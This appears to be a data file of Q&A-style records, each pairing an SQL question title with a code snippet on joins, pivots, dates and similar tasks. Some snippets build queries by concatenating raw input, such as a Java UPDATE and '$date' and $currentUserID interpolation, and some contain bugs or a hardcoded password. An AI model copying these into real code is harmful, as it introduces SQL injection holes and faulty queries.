    SET @DateLeftOrg = CASE WHEN @DateLeftOrg IS NULL THEN GetDate()
       WHEN @DateLeftOrg = '1/1/1900' THEN GetDate()
       ELSE @DateLeftOrg
       END

    SET @yy = DATEDIFF(yy, @FromDt, @DateLeftOrg)
    SET @mm = DATEDIFF(mm, @FromDt, @DateLeftOrg)
    SET @dd = DATEDIFF(dd, @FromDt, @DateLeftOrg)
    SET @getmm = ABS(DATEDIFF(mm, DATEADD(yy, @yy, @FromDt), @DateLeftOrg))
    SET @getdd = ABS(DATEDIFF(dd, DATEADD(mm, DATEDIFF(mm, DATEADD(yy, @yy, @FromDt), @DateLeftOrg)), DATEADD(yy, @yy, @FromDt)), @DateLeftOrg))
    IF @getmm = 1
       set @getmm=0

    RETURN (
      Convert(varchar(10),@yy) + 'y ' + Convert(varchar(10),@getmm) + 'm ')
END
"
21307,59636,SQL date compare,"SELECT * FROM tbl WHERE publishdate = (SELECT MAX(publishdate) FROM tbl)
"
19009,20485,How do I make sure SQL Server 2005 Express or later is installed on the target machine? And how do I run an SQL query at the end of an install?,"SQL_SERVER_2005_SEARCH >= ""9.0""
"
3878,57386,SQL for message inbox,"SELECT * FROM `messages` tm LEFT JOIN `users` tu ON `tm.from` = `tu.userid`
WHERE `tm.date` IN
    (SELECT MAX(`date`) FROM `messages` WHERE `to` = $currentUserID GROUP BY `from`);
"
12327,67150,How to use case statement in where clause,"declare @code nvarchar(20) = 'C'

SELECT *
FROM table1
WHERE (@code = 'C' AND value in ('A', 'B', 'C'))
OR (@code = 'E' AND value in ('D', 'E'))
"
24059,12427,SQL Query Sum condition,"select sum(case when rn = 1 then v.`First Amount`
                when rn = 2 then v.`Second Amount`
           end)
from (select cv.*,
             @rn := if(@vi = `Violation ID`, @rn + 1, 1) as rn,
             @vi := `Violation ID`
      from class_violation cv cross join
           (select @rn := 0, @vi := '') const 
      order by `Violation ID`
     ) cv join
     violation v
     on cv.`Violation ID` = v.`Violation ID` join
     class_record cr
     on cv.`Class Violation CR No.` = cr.`Class Violation CR No.`
where cr.`Class ID` = 'A30-000';
"
8537,71207,How to Delete all data from a table which contain self referencing foreign key,"UPDATE employee SET SeniorID = NULL
DELETE FROM employee
"
32933,5708,Mysql query return rows based on multiple column in same table,"SELECT   post_id
FROM     my_table
WHERE    (key = 'year' AND value = '2014') OR
         (key = 'month' AND value = '09')
GROUP BY post_id
HAVING   COUNT(*) = 2
"
9026,24264,Displaying the top two of summed values by group,"select 
    t1.[Group], t1.StudentID, t1.SumOfMark
from

    (select [Group], StudentID, sum(Mark) as SumOfMark
    from QueryTotalGrades
    group by [Group], StudentID) as t1

where

    (select count(*) from

        (select [Group], StudentID, sum(Mark) as SumOfMark
        from QueryTotalGrades
        group by [Group], StudentID) as t2

        where 
            t2.[Group] = t1.[Group] and
            t2.SumOfMark >= t1.SumOfMark) <= 2

order by 
     t1.[Group], t1.SumOfMark desc
"
15997,61261,SQL: Outputting Multiple Rows When Joining From Same Table,"select * from table where id = 1
union
select * from table where oldid = 1
"
13497,60844,SQL Server Database Diagram Show relationships,"SELECT 
  [ForeignKey] = f.name
, [TableName] = OBJECT_NAME(f.parent_object_id), COL_NAME(fc.parent_object_id,fc.parent_column_id)
, [ReferenceTableName] = OBJECT_NAME (f.referenced_object_id)
, ReferenceColumnName = COL_NAME(fc.referenced_object_id, fc.referenced_column_id)
FROM 
sys.foreign_keys AS f
INNER JOIN sys.foreign_key_columns AS fc ON f.OBJECT_ID = fc.constraint_object_id
"
11681,72482,"Updating a double value, but not higher than x value?","UPDATE base_resources
    SET value = least(value + ?, 1500)
    WHERE resource_id = ?
    AND base_id = ?
"
25527,17626,Aggregate function in inline view,"select x.""Number of orders placed"",count(x.CustomerName) as
       ""Number of customers that have purchased this many orders"" 
from 
(select count(OrderNumber) as ""Number of orders placed"", CustomerName 
 from PURCHASES 
 group by CustomerName
) x
group by x.""Number of orders placed"" 
"
36579,52682,SQL IF statement?,"select (case when TransDate < '2012-06-30' then TransAmt else 0 end)
. . .
"
10511,32142,Dynamic rows to columns from multiple tables with mysql,"SET SESSION group_concat_max_len = 10000;
SELECT GROUP_CONCAT(DISTINCT CONCAT('MAX(IF(D.ID = ',D.ID,', D.ID, NULL)) as \'', D.DESCRIPTION, '\'')) INTO @sql FROM Dice D;

SET @s = CONCAT('SELECT C.*, ', @sql, ' FROM Cars C INNER JOIN Stock S ON C.Id = S.Car_Id  INNER JOIN Dice D ON S.DICE_ID = D.ID GROUP BY C.ID');

PREPARE stmt FROM @s;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
"
34312,37186,Hard join. Is it possible?,"SELECT f.name, t.subject, p.message
FROM posts AS p
INNER JOIN threads AS t
  ON p.threadid = t.id
INNER JOIN forums AS f
  ON t.forumid = f.id
WHERE p.id = 32
"
25443,69617,Gain names of the column based on comparision between tables,"select 
      t1.name TableName, 
      c1.name ColumnName,
      types.name,
      c1.max_length,
      c1.precision,
      c1.scale
 from sys.columns c1
inner join sys.columns c2
   -- Condition to join columns - same name, type, length, precision and scale
   on c1.name = c2.name
  and c1.system_type_id = c2.system_type_id
  and c1.max_length = c2.max_length
  and c1.precision = c2.precision
  and c1.scale = c2.scale
   -- Exclude template table
  and c1.object_id <> c2.object_id
inner join sys.tables t1
   on c1.object_id = t1.object_id
inner join sys.types
   on c1.system_type_id = types.system_type_id
inner join sys.tables t2
   on c2.object_id = t2.object_id
where t2.name = 'Product_B'
   -- remove if you want to search for matches in all tables 
  and t1.name = 'Product_A'
"
6919,29364,Subquery returned more than 1 value. Inner Query,"SELECT * FROM dbo.tbl_Category
WHERE CatID IN(
    SELECT AssignCategory 
    FROM tbl_Course
    UNION
    SELECT CAST(split.S as int) 
    FROM tbl_Course
    CROSS APPLY dbo.StrSplit(',', AdditionalCat) as split )

SELECT * FROM dbo.tbl_Category
WHERE CatID NOT IN(
    SELECT AssignCategory 
    FROM tbl_Course
    UNION
    SELECT CAST(split.S as int) 
    FROM tbl_Course
    CROSS APPLY dbo.StrSplit(',', AdditionalCat) as split )
"
28668,33125,Checking if value exists in SQL and if not returning another row,"SELECT *
FROM products p
LEFT JOIN translations t
ON (p.id == t.product_id
    AND (t.lang == 'en'
         OR (t.lang == 'zz' AND
             'en' NOT IN
             (SELECT `lang` FROM translations t2 WHERE t2.product_id == p.id)
            )
        )
   );
"
25150,50619,SQL: Union of polygons,"CREATE TABLE #g (i INT IDENTITY, a geometry)
INSERT INTO #g (a)
VALUES
    (geometry::STGeomFromText(
        'POLYGON((0 0, 3 0, 3 3, 0 3, 0 0))', 0)
    ),
    (geometry::STGeomFromText(
        'POLYGON((5 2, 7 2, 7 0, 5 0, 5 2))', 0)
    )

DECLARE @g geometry
SELECT TOP 1 @g = a FROM [#g]
SELECT @g = @g.STUnion(a) FROM #g

SELECT @g
"
33882,25628,Understand Sub-Queries,"select c.cust_id, v.vend_id, coalesce(cv.total, 0)
fro Customers c cross join
    Vendors v left outer join
    (select o.cust_id, v.vend_id, sum(oi.quantity * oi.item_price) as total
     from orders o join 
          orderitems oi
          on o.order_num = oi.order_num join
          Products p
          on oi.prod_id = p.prod_id
     group by o.cust_id, v.vend_id
    ) cv
    on cv.vend_id = v.vend_id and 
       cv.cust_id = c.cust_id
order by c.cust_id;
"
28673,30272,MS Access Columns and sums,"select ColumnA, ColumnB,
       (select sum(ColumnB)
        from table1 as t2
        where t2.ColumnA = t.ColumnA
       ) as ColumnC
from table1 as t;
"
26942,72839,How do I reference a SSRS report parameter in an aggregate function in SQL,"DECLARE @MonthNum int;
DECLARE @ReportYear int,
    @StartDate date,
    @EndDate date

SET @MonthNum = CASE WHEN (MONTH(GETDATE())=1) THEN 12 ELSE MONTH(GETDATE()) - 1 END;
SET @ReportYear = CASE WHEN (MONTH(GETDATE())=1) THEN 
YEAR(GETDATE())-1 ELSE YEAR(GETDATE()) END;

SELECT
COUNT(CASE WHEN (MONTH(tblInvoices.fldDeliveredDate) = @MonthNum AND
(YEAR(tblInvoices.fldDeliveredDate)) = @ReportYear) THEN tblSessions.fldStudioNo END) 
AS MonthVolume

FROM tblInvoices INNER JOIN
tblSessions ON tblInvoices.fldSesID = tblSessions.fldSesID INNER JOIN
tblSessionCustom ON tblSessions.fldSesID = tblSessionCustom.fldSessionCustomID 
INNER JOIN
tblCompInfo ON tblSessions.fldStudioNo = tblCompInfo.fldStudioNo
Where tblInvoices.fldDeliveredDate between @StartDate and @EndDate

GROUP BY tblSessions.fldStudioNo, tblCompInfo.fldCompName
HAVING (NOT (tblSessions.fldStudioNo LIKE '999'))
"
8600,48123,SQL query to exclude certain values from table,"SELECT DISTINCT room_id
FROM room_booking
WHERE room_id NOT IN 
    (SELECT DISTINCT room_id
     FROM room_booking
     WHERE date_booked = '$date'
    )
"
27885,32882,How can I select a column to sum total price from earlier date,"select t.*,
       (select sum(t2.price)
        from table t2
        where t2.orderId = t.orderId and t2.date <= t.date
       ) as CumulativePrice
from table t;
"
35156,25579,Ora SQL Query: joining without references,"SELECT T1.CODE,
       T2.CODE, 
       T3.VALUE
FROM TABLE1 T1
    LEFT JOIN TABLE2 T2 ON T1.REF = T2.CODE
    LEFT JOIN TABLE3 T3 ON COALESCE(T2.REF,'DEF') = T3.CODE 
WHERE T1.CODE = XXXXX
"
38767,19576,grant user in another database,"create database link to_my_database connect to guest_in_my_database identified by 'bigsecret' using tns_alias_to_my_database;
"
38907,43414,SQL Casing Help for Date Time Clause,"SELECT
  SUM(CASE
    WHEN DATEDIFF(dd, sm.UPDATE_DATE, GETDATE()) <= 3 THEN 1
    ELSE 0
  END) 'DaysWithin3'
FROM EAT_Tickets
LEFT JOIN MAS_Users
  ON EAT_Tickets.tic_assignedTo = MAS_Users.use_userKey
INNER JOIN EAT_TicketStatusesLK
  ON EAT_Tickets.tic_ticketStatusKey = EAT_TicketStatusesLK.tis_ticketStatusKey
INNER JOIN [HSHPSQL03].[ServiceManager].dbo.[OCMLM1] sm
  ON sm.NUMBER = EAT_Tickets.tic_oarID
WHERE sm.UCD_Status <> 'Closed'
AND sm.UCD_Status <> 'denied'
AND sm.NUMBER = EAT_Tickets.tic_oarID
AND sm.UCD_BRIEF_DESC NOT LIKE '%Access termination%'
AND MAS_Users.use_ADLogin = 'User1' 
"
12046,26989,Remove all shorter subsequences containing an ID in a recursive CTE,"WITH [root] AS (
    SELECT www.menuID,
           CAST(www.title + ' (' + mi.modulename + ')' AS VARCHAR(200)) AS [path],
           CAST(mi.id AS VARCHAR(20)) AS ids,
           mi.id as lastId
    FROM [dbo].[module_info] mi INNER JOIN
         [dbo].[WWW_Menu] www 
         ON www.menuid = mi.menu_id
    WHERE www.location LIKE 'modules/%'
    UNION ALL
    SELECT leaf.menuID,
           CAST([root].[path] + ' > ' + leaf.title AS VARCHAR(200)),
           CAST([root].ids + ',' + CONVERT(VARCHAR(4), mi.id) AS VARCHAR(20)),
           mi.id
    FROM [dbo].[WWW_Menu] leaf INNER JOIN
         [root]
         ON leaf.parent = [root].menuID INNER JOIN
         [dbo].[module_info] mi
         ON leaf.menuID = mi.menu_id
    )
SELECT [path], ids
FROM (SELECT r.*,
             ROW_NUMBER() OVER (PARTITION BY lastId ORDER BY length(path) DESC) as seqnum
      FROM [root] r
     ) r
WHERE seqnum = 1;
"
36770,55253,How to assign the max value across mulptiple fields to a single column in a select statement using MS-Access-2010 SQL?,"select max(v) as maggiore from (
select id,d1 as v from table
union all
select id,d2 from table
union all
select id,d3 from table
union all
select id,d4 from table
) as t
group by id
"
14634,75249,If Exist or Exists?,"IF EXISTS (SELECT *
           FROM   tblOne
           WHERE  field1 = @parm1
                  AND field2 = @parm2)
    OR EXISTS (SELECT *
               FROM   tblTwo
               WHERE  field1 = @parm5
                      AND field2 = @parm3)
  PRINT 'YES' 
"
28830,30675,Change ondelete behavior on SQL table,"ALTER TABLE cms__model__file_taggable_tag
  DROP FOREIGN KEY cms__model__file_taggable_tag_id_cms__model__file_id
"
8994,16012,Query to generate a list of date times,"with par as (
  select date '2015-07-04' enddate, 3 LookBackDays, 300 inteval, 'Bob' Name, 
         '09:00' open, '13:00' close from dual),
t1 as (
  select to_char(enddate-level+1, 'yyyy-mm-dd') dt, name, open, close from par
    connect by level <= LookBackDays + 1 ),
t2 as (
  select to_char(to_date(open, 'hh24:mi') + (level) * inteval / (24*60*60), 'hh24:mi') tm
    from par
    connect by to_date(open, 'hh24:mi') + level * inteval / (24*60*60) 
               <= to_date(close, 'hh24:mi') )
select to_date(dt, 'yyyy-mm-dd') dt, 
       to_date(dt||' '||open, 'yyyy-mm-dd hh24:mi') open, 
       to_date(dt||' '||close, 'yyyy-mm-dd hh24:mi') close, name, 
       to_date(dt||' '||tm, 'yyyy-mm-dd hh24:mi') IntervalEnd
  from t1 cross join t2 order by dt, tm
"
23843,12141,Run SQL statements that are saved in a table,"DECLARE @SQL NVARCHAR(MAX) = '';
SELECT @SQL = @SQL + YourColumn + '; '
FROM YourTable;

EXECUTE sp_executesql @SQL;
"
27093,17176,Send job results to sql table,"INSERT INTO Query_results(login_name, total_elapsed_time, total_elapsed_time)
SELECT login_name, total_elapsed_time, total_elapsed_time FROM     
sys.dm_exec_sessions 
"
37123,74410,How do I convert a varchar price column containing a currency symbol and then sum it?,"SELECT SUM(REPLACE(price,'$','')) AS cr 
FROM TABLENAME 
WHERE Valet_Company = ""Demo Company""
"
24581,19816,How can I select the required records?,"SELECT Brand.name, COUNT(Awards.id) AS Awards
FROM Brand
LEFT JOIN Product ON product.brand_id = Brand.id AND Product.is_published = TRUE /* This may need to be changed based on the data type of is_published */
LEFT JOIN ProductAwards ON ProductAwards.product_id = Product.id
LEFT JOIN Awards ON Awards.id = ProductAwards.award_id
WHERE Brand.is_published = TRUE /* As with Product.is_published, this clause is dependent on the column's data type */
"
3808,33555,How do I use Dynamic SQL to Generate Groups of Columns?,"DECLARE @sql AS varchar(max)
DECLARE @select_list AS varchar(MAX) 

SELECT @select_list = ISNULL(@select_list + ', ', '') + 'SUM(CASE WHEN PIVOT_CODE = ' + [PIVOT_CODE] + ' THEN number ELSE NULL END) AS number_' + [PIVOT_CODE] + ', MIN(CASE WHEN PIVOT_CODE = ' + [PIVOT_CODE] + ' THEN temp ELSE NULL END) AS temp_' + [PIVOT_CODE] + ', MIN(CASE WHEN PIVOT_CODE = ' + [PIVOT_CODE] + ' THEN fruit ELSE NULL END) AS fruit_' + [PIVOT_CODE]
FROM (
    SELECT DISTINCT PIVOT_CODE
    FROM (
        SELECT name, fruit, number, temp, CONVERT(varchar(20), ROW_NUMBER() OVER (PARTITION BY name ORDER BY NAME,number)) AS PIVOT_CODE
        FROM #stackoverflowTest
    ) AS rows
) AS PIVOT_CODES

SET @sql = '
;WITH p AS (
    SELECT name, fruit, number, temp, ROW_NUMBER() OVER (PARTITION BY name ORDER BY name,number) AS PIVOT_CODE
    FROM #stackoverflowTest
)
SELECT name, ' + @select_list + '
FROM p GROUP BY name'
EXEC (@sql)
"
33499,24339,Conditional SELECT depending on a set of rules,"SELECT
  SUM(CASE WHEN ID = 2 THEN ELEM_01 END) AS P1Z,
  SUM(CASE WHEN ID = 4 THEN ELEM_03 END) AS P2Z,
  SUM(CASE WHEN ID = 4 THEN ELEM_02 END) AS P3Z,
  SUM(CASE WHEN ID = 3 THEN ELEM_03 END) AS P4Z
...
"
20124,40264,How can I update a field of a table with random numbers of specific range,"UPDATE T SET numericcode = n
FROM ExamTable T
inner join
(SELECT ExamId,studentId,semesterId,ROW_NUMBER()OVER(ORDER BY NEWID() ASC) n     
FROM ExamTable)T2
    ON T.ExamId = T2.ExamID
    AND T.studentId = T2.studentId 
    AND T.semesterId = T2.semesterId 
"
21209,4531,Timesheet relational database design,"SELECT ts.*, po.project_role
FROM timesheet ts
LEFT JOIN project_organization po ON
   po.user_id = ts.user_id AND
   ts.entry_date BETWEEN po.start_date AND po.finish_date
"
10532,19706,postgresql update newest rows,"UPDATE 
    product_history 
SET 
    status = 'NEW'
FROM 
(
    SELECT 
        ph2.product_id, max(ph2.id) as id 
    FROM 
        product_history ph2
    WHERE 
        ph2.product_id = 30470
    GROUP BY ph2.product_id
) AS ph_temp
WHERE 
    product_history.id = ph_temp.id
"
298,18575,Extra clauses with a CTE and Geopgraphy datatype,"DECLARE @miles [float] = 100;
DECLARE @myposition geography;
SELECT @myposition = GeoLocation FROM ZipCodes
WHERE Zip LIKE '28790'; --OR city like 'brooklyn';--'11204';

SELECT z.*,z.GeoLocation.STDistance(@myposition) AS Distance INTO #HASHTABLE FROM ZipCodes z
WHERE z.GeoLocation.STDistance(@myposition) <= (@miles*1609.344)
ORDER BY Distance asc

;WITH Results_CTE AS (SELECT u.*,z.GeoLocation.STDistance(@myposition) AS Distance, ROW_NUMBER() OVER (ORDER BY z.GeoLocation.STDistance(@myposition), userid) AS RowNum
FROM Users u INNER JOIN ZipCodes z ON u.PostCode = z.Zip
WHERE 
-- Using zip code and distance
-- u.PostCode in (SELECT Zip from #hashtable) 

-- using a link table to find users skilled in wrestling
-- OR UserID IN (SELECT UserID from UserSkills us INNER JOIN Skills s ON us.SkillID = s.SkillID WHERE s.Name LIKE 'wrestlin%') 

-- scalar properties of the UserProfiles table
-- DisplayName like 'johnny%'
) SELECT * FROM Results_CTE WHERE RowNum > 0 
DROP TABLE #Hashtable
"
26290,14815,MS SQL is this possible to do in a view?,"select
    a.LineID, b.Date,
    sum(case when isnull(c.IsWorking, b.IsWorking) = 1 then d.HowLongWorks else 0 end) as HowLongWorks
from TableA as a
    cross join TableB as b
    left outer join TableC as c on
        c.LineID = a.LineID and c.Date = b.Date and c.ShiftID = b.ShiftID 
    left outer join TableD as d on d.ShiftID = b.ShiftID
group by a.LineID, b.Date
order by LineID, Date
"
24008,18267,SQL Compare 2 columns from 2 tables to complete another column,"update b
set b.Fee_Sched = a.Fee_Sched, b.Fee_Sched_Eff = Effective_Date
from TableB b
join TableA a on a.TIN = b.TIN
"
19608,55155,What is an efficient way to retrieve data based on all combinations of two columns?,"create table Weather(Weather_ID int, Type varchar(50));
create table Location(Location_ID int, Type varchar(50));
create table CrashData(Case_ID int, Weather_ID int, location_ID int);

insert into Weather(Weather_ID, Type)
values(1, 'Clear'), (2, 'Cloudy');

insert into Location(Location_ID, Type)
values(1, 'Intersection'), (2, 'Parking Lot');

insert into CrashData(Case_ID, Weather_ID, Location_ID)
values(1, 1, 1), (2, 1, 2), (3, 2, 1), (4, 2, 1);

SELECT Weather, Location, Sum(CASE WHEN Case_ID IS NULL THEN 0 ELSE 1 END)  Number_Of_Cases
FROM (SELECT Weather.Weather_ID, Weather.Type Weather,
        Location.Location_ID, Location.Type Location
    FROM Weather, Location) Temp 
LEFT OUTER JOIN CrashData
ON Temp.Weather_ID=CrashData.Weather_ID
    AND Temp.Location_ID=CrashData.Location_ID
GROUP BY Weather, Location
ORDER BY Weather, Location
"
26749,38793,self referencing table with child table,"WITH
  tree AS
(
  SELECT
    id                AS root_id,
    name              AS root_name,
    id                AS leaf_id
  FROM
    yourTreeTable

  UNION ALL

  SELECT
    tree.root_id      AS root_id,
    tree.name         AS root_name,
    yourTreeTable.id  AS leaf_id
  FROM
    tree
  INNER JOIN
    yourTreeTable
      ON tree.leaf_id = yourTreeTable.ParentID
)
SELECT
  tree.root_id,
  tree.root_name,
  COALESCE(SUM(yourScoresTable.score), 0) AS total
FROM
  tree
LEFT JOIN
  yourScoresTable
    ON yourScoresTable.ID = tree.leafID
GROUP BY
  tree.root_id,
  tree.root_name
"
29603,55402,Between clause from recordset,"SELECT  b.value1, b.value2, sum(a.Stat) 
FROM   table2 a
       JOIN table1 b
         ON a.value BETWEEN b.value1 AND b.value2 
 GROUP BY b.value1, b.value2
"
28650,63215,Convert Check box boolean value to string in BIRT 4.1?,"params[""myBooleanCheckbox""].value==null || !params[""myBooleanCheckbox""].value?""0"":""1"";
"
25864,18288,Many-to many query,"SELECT TOP 5 tag_id, count(*) cnt
FROM Taggins
GROUP BY tag_id
ORDER BY cnt DESC
"
15072,38151,SQL Query to find earliest date dependent on column value changing,"SELECT  JobCodeId, MIN(LastEffectiveDate) AS mindate
FROM    (
        SELECT  *,
                prn - rn AS diff
        FROM    (
                SELECT  *,
                        ROW_NUMBER() OVER (PARTITION BY JobCodeID 
                                    ORDER BY LastEffectiveDate) AS prn,
                        ROW_NUMBER() OVER (ORDER BY LastEffectiveDate) AS rn
                FROM    @tmp
                ) q
        ) q2
GROUP BY
        JobCodeId, diff
ORDER BY
        mindate
"
35422,74088,Update top N rows with N specific for each row from other table,"UPDATE t
    SET SomeId = NULL 
FROM (SELECT t.*, ROW_NUMBER() OVER (PARTITION BY t.SomeId ORDER BY t.SomeId) as seqnum
      FROM dbo.TableName t
      WHERE t.Status = 960
     ) t JOIN
     @Quantities q 
     ON q.SomeId = ie.SomeId;
"
3564,39023,Will inserted and deleted record count always be equal in an update trigger?,"UPDATE TableA SET Column1 = ""ABC"" WHERE Column1 = ""DEF""
"
12971,65223,Setting one column value after another,"CREATE TRIGGER id_root_same AFTER INSERT ON categories 
FOR EACH ROW SET root = NEW.id;
"
22420,60201,Using Count value in WHERE clause,"SELECT tel_number.number, COUNT(DISTINCT(i2.id_img)) as matching_img_count
FROM img_reference i
JOIN img_reference i2 ON i.id_img = i2.id_img
JOIN tel_number ON i.id_tel = tel_number.id_tel
WHERE tel_number.id_tel != 13777
    AND i2.id_tel=13777
GROUP BY i.id_tel, i2.id_tel
HAVING matching_img_count > 1
"
31531,16612,SQL - Grouping results of SELECT but keep some values unique,"SELECT year, 
       SUM(wins), 
       SUM(cuts), 
       sum(case when tour = 'EUR' then money end) as moneyEUR,
       sum(case when tour = 'USA' then money end) as moneyUSA
FROM players 
GROUP BY year
"
26810,55370,Сalculating run down dates using only percentages using Microsoft SQL Server,"declare @res table(
    id int identity(1,1)
    ,total int
    ,start date
    ,[end] date
    ,used float )


insert into @res(total, start , [end], used) 
values
    (350, '20120101', '20121231', 0.806)
    ,(250, '20120101', '20121231', 0.515)   


select 
*
,used/DATEDIFF(DAY,start,GETDATE()) as avUsePerDay
,1/(used/DATEDIFF(DAY,start,GETDATE())) as expectedDaysTotal
,DATEADD(day,1/(used/DATEDIFF(DAY,start,GETDATE())),start) as expectedToDie
from @res
"
18925,29964,INSERT INTO from select statement except one field in mysql,"$sql = ""INSERT INTO `TAB1` (user,name,category, brand, image_url,big_img)
        SELECT ?,a.name,b.category, b.brand, a.image_url,a.big_img
        FROM `mTaB2` a INNER JOIN `mTab3` b
        ON a.tid = b.id 
        WHERE a.id = ?           
       "";
$users = $dbh->prepare($sql);
$users->bindValue(1, $_POST[""user""]);
$users->bindValue(2, $_POST[""id""]);
$result = $users->execute();
"
11424,45570,SQL UPDATE (Cannot update more than 1 field),"String sql = ""UPDATE User Set address = '"" + address +""', userType = '"" + userType +""' WHERE useridNric = '"" + id + ""'"";
"
8474,30478,SQL pivot dynamic columns out of an nvarchar column containing xml,"-- Sample data
declare @T table
(
  ID int,
  Title nvarchar(10),
  FieldsXml nvarchar(max)
)
insert into @T values
(1,     'A',       '<Fields><Field Name=""X"">x1</Field><Field Name=""Y"">y1</Field></Fields>'),
(2,     'B',       '<Fields><Field Name=""Y"">y2</Field><Field Name=""Z"">z2</Field></Fields>'),
(3,     'C',       '<Fields><Field Name=""Z"">z3</Field></Fields>')

-- Create temp table 
select T.ID,
       T.Title,
       TN.X.value('@Name', 'nvarchar(128)') as FieldName,
       TN.X.value('.', 'nvarchar(max)') as FieldValue
into #tmp       
from @T as T     
  cross apply (select cast(FieldsXml as XML)) as TX(X)
  cross apply TX.X.nodes('/Fields/Field') as TN(X)  


declare @ColList nvarchar(max)
declare @Sql nvarchar(max)

-- Build column list
select @ColList = stuff((select '], ['+FieldName
                         from #tmp
                         group by FieldName
                         for xml path('')), 1, 2, '')+']'

-- Build query
set @Sql = 'select * 
            from (select ID,
                         Title, 
                         FieldName, 
                         FieldValue
                  from #tmp 
                 ) as T
            pivot (min(FieldValue) for FieldName in (' + @ColList + ')) as P'

exec (@Sql)

drop table #tmp
"
27869,12105,Spool to save file with pipe '|',"set colsep ""|""
"
16069,26331,"is primary key (a,b) different from primary key (b,a)?","CREATE PROCEDURE AddSupervisor
(
   @supervisor_id int,
   @employee_id
)
AS
    INSERT INTO supervisor
    SELECT @supervisor_ID, @employee_id
    WHERE
    NOT EXISTS
    (
        SELECT 1 FROM supervisor
        WHERE
            supervisor_id = @employee_id AND
            employee_id = @supervisor_id
    ) AND NOT EXISTS  -- EDIT - Add logic to stop inserts for employees who already have a supervisor
    (
        SELECT 1 FROM supervisor
        WHERE
            employee_id = @employee_id
    )

    SELECT @@ROWCOUNT
"
30487,36037,How do I enforce SQL join conditions across multiple joined rows?,"SELECT * from tournaments
WHERE id IN
( SELECT tournaments.id
  FROM tournaments INNER JOIN games ON tournaments.game_id = games.id
  GROUP BY tournaments.id
  HAVING MIN(games.event_date) >= now()
)
"
10801,51490,How to calculate moving average in SQL?,"SELECT *,
       (SELECT Sum(output)
        FROM   table1 b
        WHERE  b.week IN( a.week, a.week - 1, a.week - 2 )) AS SUM
FROM   table1 a 
"
31890,10838,Backfilling with following row details,"data have;
input Sequence ID LastStatus  $;
infile datalines missover;
datalines;
1        1               
2        1  New           
3        1               
4        1               
5        1               
6        1  Open         
7        1               
8        1               
9        1  Closed       
10       2               
11       2  New          
12       2               
13       2  Open         
14       2  Closed       
15       3               
16       3  New          
;;;;
run;

proc sort data=have;
by id  descending sequence;
run;

data want;
set have;
length CurrentStatus $8;
by id  descending sequence;      *so the last sequence for each ID comes first;
retain CurrentStatus;            *keep its value for each row;
if first.id then 
 call missing(CurrentStatus);    *reset for each ID;
output;                          *put out the current line;
if not missing(LastStatus) then  
   CurrentStatus = LastStatus;   *now update CurrentStatus if needed;
run;

proc sort data=want;             *resort in logical order;
by id sequence;
run;
"
27548,21727,sql query with if condition,"SELECT id,name 
FROM service 
where id not in (select service_id from clients 
                where client = whichever_is_currently_logged_in_by_id?)
"
16540,16567,RETURNING rows using unnest()?,"WITH upd AS (
    UPDATE Notis new_noti SET notis = '{}'::noti_record_type[] 
    FROM (SELECT * FROM Notis WHERE user_id = 2 FOR UPDATE) old_noti 
    WHERE old_noti.user_id = new_noti.user_id RETURNING old_noti.notis
    )
SELECT unnest(notis) FROM upd;
"
30364,68359,how to prevent duplicate entry in table?,"ALTER TABLE tableName ADD CONSTRAINT tb_uq UNIQUE (post_id, tag_id)
"
24926,7678,"SQL: UPDATE if not exists, else DELETE","--Delete records with X if same user has Y 
delete t1
from userRoles t1 join (
    select * from userRoles t2 where t2.role_id = 'y') t3
    on t1.user_id = t3.user_Id
where t1.role_id = 'x'

--Update all Y records to X
update userRoles set role_id = 'X'
where role_id = 'y'

select * from userRoles
--RESULTS
USER_ID ROLE_ID
A         X
A         Z
B         X
C         X
D         X
"
19896,73431,Group by true or false in several groups,"var list = new List<Test>();
list.Add(new Test(1, true, true));
list.Add(new Test(2, true, true));
list.Add(new Test(3, true, true));
list.Add(new Test(4, true, false));
list.Add(new Test(5, true, false));
list.Add(new Test(6, true, false));
list.Add(new Test(7, true, true));
list.Add(new Test(8, true, true));
list.Add(new Test(9, true, false));

var listTemp = list;
var result = new List<Tuple<bool, List<Test>>>();

while (listTemp.Count > 0)
{
    var approved = listTemp[0].Approved;
    var tuple = new Tuple<bool, List<Test>>(approved, listTemp.TakeWhile(x => approved == x.Approved).ToList());
    result.Add(tuple);
    listTemp = listTemp.SkipWhile(x => approved == x.Approved).ToList();
}
"
17723,73929,Deleting part of a string in MYSQL,"UPDATE table SET fieldname=REPLACE(fieldname,'APS','')
"
4179,50741,SQL select one row from table 1 joining on multiple rows in table 2,"select
i.name 
from interests i
where i.interest in ('Books','Dancing')
and not exists
(
  select 1 from interests i1
  where interest not in ('Books','Dancing')
  AND i.name = i1.name
)
group by i.name
having count(*) = 2
"
29967,10853,MySQL filtering result from a foreign key that doesn't have contents,"select distinct test_category._id, test_category.score_type from test_category 
join questions
on 'questions.test_cat' = 'test_category._id'
"
2689,65060,Duplicate results from SQL Inner Join (SCCM 2012 WQL),"SELECT table1.Name, table1.CollectionID, table2.ContainerNodeID
FROM table1
INNER JOIN table2 ON table1.CollectionID = table2.InstanceKey
WHERE table1.CollectionID IN
(
    SELECT DISTINCT InstanceKey 
    FROM table2
    WHERE ObjectType='5000' AND (ContainerNodeID=16777279 OR ContainerNodeID=16777220)
) AND CollectionType='2' 
ORDER BY table1.Name
GROUP BY table1.Name, table1.CollectionID, table2.ContainerNodeID
"
10380,66195,Select specified value when having duplicate keys,"SELECT outerA.*
  FROM items AS outerA
    LEFT JOIN (SELECT innerA.*
                 FROM rented AS innerA
                   JOIN (SELECT MAX(id) AS id 
                           FROM rented 
                           GROUP BY itemID) AS innerB
                     ON innerB.id = innerA.id) AS outerB
      ON outerB.itemID = outerA.id
  WHERE outerB.state IS NULL
    OR outerB.state = 1;
"
36337,16257,like OR operator in Cakephp,"$this->find('all', array(
    'conditions' => array(
        'OR' => array(
            array(
                ""Message.mobileNo LIKE"" => ""%Contact.mobileNo"",
            ),
            array(
                ""Message.mobileNo LIKE"" => ""%Contact.homeNo"",
            ),
            array(
                ""Message.mobileNo LIKE"" => ""%Contact.workNo"",
            )
        )
    ),
    'fields' => array('DISTINCT mobileNo')
));
"
39167,313,Optimization of an SQL Query on multiple tables with Left joins,"SELECT t . * ,te+tc+tt as total , (,te+tc+tt)/7 as weekly_Avg
FROM 
(
    SELECT t2.first_name, emails_count AS te, calls_count AS tc, tasks_count AS tt
    FROM  `users` AS t2
    LEFT JOIN 
    (
        SELECT assigned_user_id, COUNT( emails.id ) AS emails_count
        FROM emails 
        WHERE emails.assigned_user_id IN ( '1',  '2')
